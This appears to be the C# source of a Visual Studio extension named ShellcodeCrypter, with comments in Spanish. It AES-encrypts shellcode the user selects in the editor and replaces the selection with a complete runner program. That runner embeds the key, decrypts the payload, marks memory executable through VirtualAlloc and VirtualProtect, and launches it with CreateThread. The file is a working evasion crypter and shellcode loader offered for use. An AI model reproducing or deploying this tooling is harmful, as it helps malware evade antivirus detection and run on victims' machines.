using System;
using System.ComponentModel.Design;
using System.Globalization;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.VisualStudio.Shell;
using Microsoft.VisualStudio.Shell.Interop;
using Task = System.Threading.Tasks.Task;

namespace ShellcodeCrypterVSExtension
{
    /// <summary>
    /// Command handler
    /// </summary>
    internal sealed class ShellcodeCrypterCommand
    {
        /// <summary>
        /// Command ID.
        /// </summary>
        public const int CommandId = 0x0100;

        /// <summary>
        /// Command menu group (command set GUID).
        /// </summary>
        public static readonly Guid CommandSet = new Guid("11111111-2222-3333-4444-555555555555");

        /// <summary>
        /// VS Package that provides this command, not null.
        /// </summary>
        private readonly AsyncPackage package;

        /// <summary>
        /// Initializes a new instance of the <see cref="ShellcodeCrypterCommand"/> class.
        /// </summary>
        /// <param name="package">Owner package, not null.</param>
        /// <param name="commandService">Command service to add command to, not null.</param>
        private ShellcodeCrypterCommand(AsyncPackage package, OleMenuCommandService commandService)
        {
            this.package = package ?? throw new ArgumentNullException(nameof(package));
            commandService = commandService ?? throw new ArgumentNullException(nameof(commandService));

            var menuCommandID = new CommandID(CommandSet, CommandId);
            var menuItem = new MenuCommand(this.Execute, menuCommandID);
            commandService.AddCommand(menuItem);
        }

        /// <summary>
        /// Gets the instance of the command.
        /// </summary>
        public static ShellcodeCrypterCommand Instance
        {
            get;
            private set;
        }

        /// <summary>
        /// Gets the service provider from the owner package.
        /// </summary>
        private Microsoft.VisualStudio.Shell.IAsyncServiceProvider ServiceProvider
        {
            get
            {
                return this.package;
            }
        }

        /// <summary>
        /// Initializes the singleton instance of the command.
        /// </summary>
        /// <param name="package">Owner package, not null.</param>
        public static async Task InitializeAsync(AsyncPackage package)
        {
            // Switch to the main thread - the call to AddCommand in ShellcodeCrypterCommand's constructor requires
            // the UI thread.
            await ThreadHelper.JoinableTaskFactory.SwitchToMainThreadAsync(package.DisposalToken);

            OleMenuCommandService commandService = await package.GetServiceAsync(typeof(IMenuCommandService)) as OleMenuCommandService;
            Instance = new ShellcodeCrypterCommand(package, commandService);
        }

        /// <summary>
        /// This function is the callback used to execute the command when the menu item is clicked.
        /// See the constructor to see how the menu item is associated with this function using
        /// OleMenuCommandService service and MenuCommand class.
        /// </summary>
        /// <param name="sender">Event sender.</param>
        /// <param name="e">Event args.</param>
        private void Execute(object sender, EventArgs e)
        {
            ThreadHelper.ThrowIfNotOnUIThread();

            try
            {
                EnvDTE80.DTE2 dte = Package.GetGlobalService(typeof(EnvDTE.DTE)) as EnvDTE80.DTE2;
                EnvDTE.TextSelection selection = dte.ActiveDocument.Selection as EnvDTE.TextSelection;

                if (selection != null && !selection.IsEmpty)
                {
                    string selectedText = selection.Text;
                    string encryptedShellcode = EncryptShellcode(selectedText);

                    // Reemplazar el texto seleccionado con el shellcode encriptado
                    selection.Delete();
                    selection.Insert(encryptedShellcode);

                    // Mostrar mensaje de éxito
                    VsShellUtilities.ShowMessageBox(
                        this.package,
                        "Shellcode encriptado con éxito.",
                        "ShellcodeCrypter",
                        OLEMSGICON.OLEMSGICON_INFO,
                        OLEMSGBUTTON.OLEMSGBUTTON_OK,
                        OLEMSGDEFBUTTON.OLEMSGDEFBUTTON_FIRST);
                }
                else
                {
                    VsShellUtilities.ShowMessageBox(
                        this.package,
                        "Por favor, selecciona el shellcode que deseas encriptar.",
                        "ShellcodeCrypter",
                        OLEMSGICON.OLEMSGICON_WARNING,
                        OLEMSGBUTTON.OLEMSGBUTTON_OK,
                        OLEMSGDEFBUTTON.OLEMSGDEFBUTTON_FIRST);
                }
            }
            catch (Exception ex)
            {
                VsShellUtilities.ShowMessageBox(
                    this.package,
                    $"Error al procesar el shellcode: {ex.Message}",
                    "ShellcodeCrypter Error",
                    OLEMSGICON.OLEMSGICON_CRITICAL,
                    OLEMSGBUTTON.OLEMSGBUTTON_OK,
                    OLEMSGDEFBUTTON.OLEMSGDEFBUTTON_FIRST);
            }
        }

        /// <summary>
        /// Encripta el shellcode usando AES
        /// </summary>
        /// <param name="shellcode">El shellcode a encriptar</param>
        /// <returns>Cadena de código C# para desencriptar y ejecutar el shellcode</returns>
        private string EncryptShellcode(string shellcode)
        {
            // Generar clave y vector de inicialización aleatorios para AES
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.KeySize = 256;
                aesAlg.GenerateKey();
                aesAlg.GenerateIV();

                byte[] key = aesAlg.Key;
                byte[] iv = aesAlg.IV;

                // Parsear el shellcode de formato string a bytes
                byte[] shellcodeBytes = ParseShellcode(shellcode);

                // Encriptar el shellcode
                byte[] encryptedBytes;
                using (ICryptoTransform encryptor = aesAlg.CreateEncryptor(key, iv))
                {
                    encryptedBytes = encryptor.TransformFinalBlock(shellcodeBytes, 0, shellcodeBytes.Length);
                }

                // Convertir los bytes encriptados a formato de código C#
                StringBuilder result = new StringBuilder();
                result.AppendLine("// Shellcode encriptado con ShellcodeCrypter");
                result.AppendLine("// -------------------------------");
                result.AppendLine("using System;");
                result.AppendLine("using System.Runtime.InteropServices;");
                result.AppendLine("using System.Security.Cryptography;");
                result.AppendLine("");
                result.AppendLine("namespace ShellcodeRunner");
                result.AppendLine("{");
                result.AppendLine("    class Program");
                result.AppendLine("    {");
                result.AppendLine("        [DllImport(\"kernel32.dll\")]");
                result.AppendLine("        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);");
                result.AppendLine("");
                result.AppendLine("        [DllImport(\"kernel32.dll\")]");
                result.AppendLine("        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);");
                result.AppendLine("");
                result.AppendLine("        [DllImport(\"kernel32.dll\")]");
                result.AppendLine("        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);");
                result.AppendLine("");
                result.AppendLine("        [DllImport(\"kernel32.dll\")]");
                result.AppendLine("        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);");
                result.AppendLine("");
                result.AppendLine("        static void Main(string[] args)");
                result.AppendLine("        {");
                result.AppendLine("            byte[] encryptedShellcode = new byte[] {");
                result.Append("                ");

                // Convertir los bytes encriptados a formato de array C#
                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    result.Append("0x" + encryptedBytes[i].ToString("X2"));
                    if (i < encryptedBytes.Length - 1)
                        result.Append(", ");

                    // Nueva línea cada 12 bytes para legibilidad
                    if ((i + 1) % 12 == 0 && i < encryptedBytes.Length - 1)
                        result.Append("\n                ");
                }
                result.AppendLine();
                result.AppendLine("            };");
                result.AppendLine("");
                result.AppendLine("            byte[] key = new byte[] {");
                result.Append("                ");

                // Convertir la clave a formato de array C#
                for (int i = 0; i < key.Length; i++)
                {
                    result.Append("0x" + key[i].ToString("X2"));
                    if (i < key.Length - 1)
                        result.Append(", ");

                    // Nueva línea cada 12 bytes para legibilidad
                    if ((i + 1) % 12 == 0 && i < key.Length - 1)
                        result.Append("\n                ");
                }
                result.AppendLine();
                result.AppendLine("            };");
                result.AppendLine("");
                result.AppendLine("            byte[] iv = new byte[] {");
                result.Append("                ");

                // Convertir el IV a formato de array C#
                for (int i = 0; i < iv.Length; i++)
                {
                    result.Append("0x" + iv[i].ToString("X2"));
                    if (i < iv.Length - 1)
                        result.Append(", ");

                    // Nueva línea cada 12 bytes para legibilidad
                    if ((i + 1) % 12 == 0 && i < iv.Length - 1)
                        result.Append("\n                ");
                }
                result.AppendLine();
                result.AppendLine("            };");
                result.AppendLine("");
                result.AppendLine("            // Desencriptar el shellcode");
                result.AppendLine("            byte[] shellcode = DecryptShellcode(encryptedShellcode, key, iv);");
                result.AppendLine("");
                result.AppendLine("            // Ejecutar el shellcode");
                result.AppendLine("            ExecuteShellcode(shellcode);");
                result.AppendLine("        }");
                result.AppendLine("");
                result.AppendLine("        static byte[] DecryptShellcode(byte[] encryptedData, byte[] key, byte[] iv)");
                result.AppendLine("        {");
                result.AppendLine("            byte[] decryptedData;");
                result.AppendLine("");
                result.AppendLine("            using (Aes aesAlg = Aes.Create())");
                result.AppendLine("            {");
                result.AppendLine("                aesAlg.Key = key;");
                result.AppendLine("                aesAlg.IV = iv;");
                result.AppendLine("");
                result.AppendLine("                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);");
                result.AppendLine("                decryptedData = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);");
                result.AppendLine("            }");
                result.AppendLine("");
                result.AppendLine("            return decryptedData;");
                result.AppendLine("        }");
                result.AppendLine("");
                result.AppendLine("        static void ExecuteShellcode(byte[] shellcode)");
                result.AppendLine("        {");
                result.AppendLine("            // Reservar memoria ejecutable");
                result.AppendLine("            IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);");
                result.AppendLine("");
                result.AppendLine("            // Copiar shellcode a la memoria reservada");
                result.AppendLine("            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);");
                result.AppendLine("");
                result.AppendLine("            // Proteger la memoria como ejecutable");
                result.AppendLine("            VirtualProtect(baseAddress, (uint)shellcode.Length, 0x20, out _);");
                result.AppendLine("");
                result.AppendLine("            // Crear hilo para ejecutar el shellcode");
                result.AppendLine("            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, IntPtr.Zero);");
                result.AppendLine("");
                result.AppendLine("            // Esperar a que termine la ejecución");
                result.AppendLine("            WaitForSingleObject(threadHandle, 0xFFFFFFFF);");
                result.AppendLine("        }");
                result.AppendLine("    }");
                result.AppendLine("}");

                return result.ToString();
            }
        }

        /// <summary>
        /// Convierte el texto del shellcode en formato de cadena a un array de bytes
        /// </summary>
        /// <param name="shellcodeText">Texto del shellcode</param>
        /// <returns>Array de bytes del shellcode</returns>
        private byte[] ParseShellcode(string shellcodeText)
        {
            // Eliminar espacios en blanco y caracteres especiales
            shellcodeText = shellcodeText.Replace("\n", "").Replace("\r", "").Replace("\t", "").Replace(" ", "");

            // Detectar el formato del shellcode (0x00 o \x00)
            if (shellcodeText.Contains("0x"))
            {
                // Formato 0x00, 0x01, 0x02
                shellcodeText = shellcodeText.Replace("0x", "");
                string[] byteStrings = shellcodeText.Split(',');
                byte[] result = new byte[byteStrings.Length];

                for (int i = 0; i < byteStrings.Length; i++)
                {
                    result[i] = Convert.ToByte(byteStrings[i].Trim(), 16);
                }

                return result;
            }
            else if (shellcodeText.Contains("\\x"))
            {
                // Formato \x00\x01\x02
                shellcodeText = shellcodeText.Replace("\\x", "");
                byte[] result = new byte[shellcodeText.Length / 2];

                for (int i = 0; i < result.Length; i++)
                {
                    result[i] = Convert.ToByte(shellcodeText.Substring(i * 2, 2), 16);
                }

                return result;
            }
            else
            {
                // Formato de cadena hexadecimal simple
                byte[] result = new byte[shellcodeText.Length / 2];

                for (int i = 0; i < result.Length; i++)
                {
                    result[i] = Convert.ToByte(shellcodeText.Substring(i * 2, 2), 16);
                }

                return result;
            }
        }
    }
}